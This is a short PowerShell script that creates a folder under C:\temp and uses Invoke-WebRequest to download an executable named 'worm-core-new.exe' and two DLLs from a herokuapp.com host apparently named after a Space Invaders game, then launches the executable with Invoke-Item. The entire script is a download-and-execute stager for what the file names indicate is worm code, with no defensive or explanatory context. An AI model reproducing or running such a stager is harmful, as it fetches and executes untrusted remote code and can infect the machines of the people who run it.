
# create a new folder
New-Item -Path 'C:\temp\Test' -ItemType Directory

# create a new file 
New-item C:\temp\Test\worm-core-new.exe
New-item C:\temp\Test\worm-core.dll
New-item C:\temp\Test\Newtonsoft.Json.dll

# invoke the web request 

Invoke-WebRequest https://spaceinvaders-app.herokuapp.com/worm-core-new.exe -Outfile C:\temp\Test\worm-core-new.exe
Invoke-WebRequest https://spaceinvaders-app.herokuapp.com/worm-core.dll -Outfile C:\temp\Test\worm-core.dll
Invoke-WebRequest https://spaceinvaders-app.herokuapp.com/Newtonsoft.Json.dll -Outfile C:\temp\Test\Newtonsoft.Json.dll

# execute the file 
Invoke-Item "C:\temp\test\worm-core-new.exe"


